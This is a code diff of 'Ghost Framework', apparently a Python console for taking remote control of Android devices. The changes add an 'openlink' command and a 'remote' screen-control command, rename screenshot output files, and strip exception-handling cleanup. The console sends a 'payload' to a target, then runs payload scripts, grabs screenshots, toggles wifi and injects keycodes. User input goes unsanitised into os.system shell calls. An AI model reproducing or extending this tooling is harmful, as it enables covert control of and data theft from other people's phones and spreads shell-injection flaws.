@@ -1,5 +1,23 @@
 #!/usr/bin/env python3
 
+#            ---------------------------------------------------
+#                              Ghost Framework                                                  
+#            ---------------------------------------------------
+#                Copyright (C) <2019-2020>  <Entynetproject>
+#
+#        This program is free software: you can redistribute it and/or modify
+#        it under the terms of the GNU General Public License as published by
+#        the Free Software Foundation, either version 3 of the License, or
+#        any later version.
+#
+#        This program is distributed in the hope that it will be useful,
+#        but WITHOUT ANY WARRANTY; without even the implied warranty of
+#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+#        GNU General Public License for more details.
+#
+#        You should have received a copy of the GNU General Public License
+#        along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
 import os
 
 os.system("printf '\033]2;Ghost Framework\a'")
@@ -9,7 +27,6 @@ import subprocess
 import readline
 import time
 
-I = '\033[1;77m[i] \033[0m'
 Q = '\033[1;77m[?] \033[0m'
 G = '\033[1;34m[*] \033[0m'
 S = '\033[1;32m[+] \033[0m'
@@ -36,10 +53,7 @@ def banner():
     print("")
 
 def main():
-    try:
-        ui = input('\033[4mghost\033[0m> ').strip(" ")
-    except:
-        sys.exit()
+    ui = input('\033[4mghost\033[0m> ').strip(" ")
     ui = ui.split()
     while True:
         if ui == []:
@@ -83,18 +97,12 @@ def main():
                 print(G+"Sending payload to "+target+"...")
                 time.sleep(1)
                 device = target
-                try:
-                    con = input('\033[4mghost\033[0m(\033[1;31m'+device+'\033[0m)> ').strip(" ")
-                except:
-                    os.system("chmod +x core/dctl.sh && core/dctl.sh disconnect "+target)
-                    os.system("chmod +x core/server.sh && core/server.sh stop")
-                    sys.exit()
+                con = input('\033[4mghost\033[0m(\033[1;31m'+device+'\033[0m)> ').strip(" ")
                 con = con.split()
                 while True:
                     if con == []:
                         pass
                     elif con[0] == "exit":
-                        os.system("chmod +x core/dctl.sh && core/dctl.sh disconnect "+target)
                         os.system("chmod +x core/server.sh && core/server.sh stop")
                         sys.exit()
                     elif con[0] == "disconnect":
@@ -165,6 +173,8 @@ def main():
                                 print(E+"Keycode is not found!")
                     elif con[0] == "battery":
                         os.system("chmod +x data/payloads/battery && data/payloads/battery")
+                    elif con[0] == "openlink":
+                        os.system("chmod +x data/payloads/openlink && data/payloads/openlink "+con[1])
                     elif con[0] == "activity":
                         os.system("chmod +x data/payloads/activity && data/payloads/activity")
                     elif con[0] == "netstat":
@@ -175,6 +185,11 @@ def main():
                         os.system("chmod +x data/payloads/sysinfo && data/payloads/sysinfo")
                     elif con[0] == "inet":
                         os.system("chmod +x data/payloads/inet && data/payloads/inet")
+                    elif con[0] == "remote":
+                        print("Controlling Device")
+                        os.system("if ! command -v scrcpy&>/dev/null;then chmod +x data/extra/scrcpy/run;cd data;cd extra;cd scrcpy;./run x;cd ..;cd ..;else scrcpy;fi")
+                        print(" ")
+                        print("Close the Graphical Window to stop")
                     elif con[0] == "wifi":
                         if con[1] == "on":
                             os.system("chmod +x data/payloads/wifi && data/payloads/wifi on")
@@ -234,15 +249,15 @@ def main():
                             if os.path.isdir(con[1]):
                                 if os.path.exists(con[1]):
                                     print(G+"Taking screenshot...")
-                                    os.system("chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -s "+con[1]+"/screenshot.png")
+                                    os.system("chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -s "+con[1]+"/screen.png")
                                     if con[1][-1] == "/":
-                                        print(G+"Saving to "+con[1]+"screenshot.png...")
+                                        print(G+"Saving to "+con[1]+"screen.png...")
                                         time.sleep(1)
-                                        print(S+"Saved to "+con[1]+"screenshot.png!")
+                                        print(S+"Saved to "+con[1]+"screen.png!")
                                     else:
-                                        print(G+"Saving to "+con[1]+"/screenshot.png...")
+                                        print(G+"Saving to "+con[1]+"/screen.png...")
                                         time.sleep(1)
-                                        print(S+"Saved to "+con[1]+"/screenshot.png!")
+                                        print(S+"Saved to "+con[1]+"/screen.png!")
                                 else:
                                     print(E+"Local directory: "+con[1]+": does not exist!")
                             else:
@@ -409,20 +424,11 @@ def main():
                                 print(E+"Local file: "+con[1]+": does not exist!")
                     else:
                         print(E+"Unrecognized command!")
-                    try:
-                        con = input('\033[4mghost\033[0m(\033[1;31m'+device+'\033[0m)> ').strip(" ")
-                    except:
-                        os.system("chmod +x core/dctl.sh && core/dctl.sh disconnect "+target)
-                        os.system("chmod +x core/server.sh && core/server.sh stop")
-                        sys.exit()
+                    con = input('\033[4mghost\033[0m(\033[1;31m'+device+'\033[0m)> ').strip(" ")
                     con = con.split()
         else:
             print(E+"Unrecognized command!")
-        try:
-            ui = input('\033[4mghost\033[0m> ').strip(" ")
-        except:
-            os.system("chmod +x core/server.sh && core/server.sh stop")
-            sys.exit()
+        ui = input('\033[4mghost\033[0m> ').strip(" ")
         ui = ui.split()
 
 start_server()
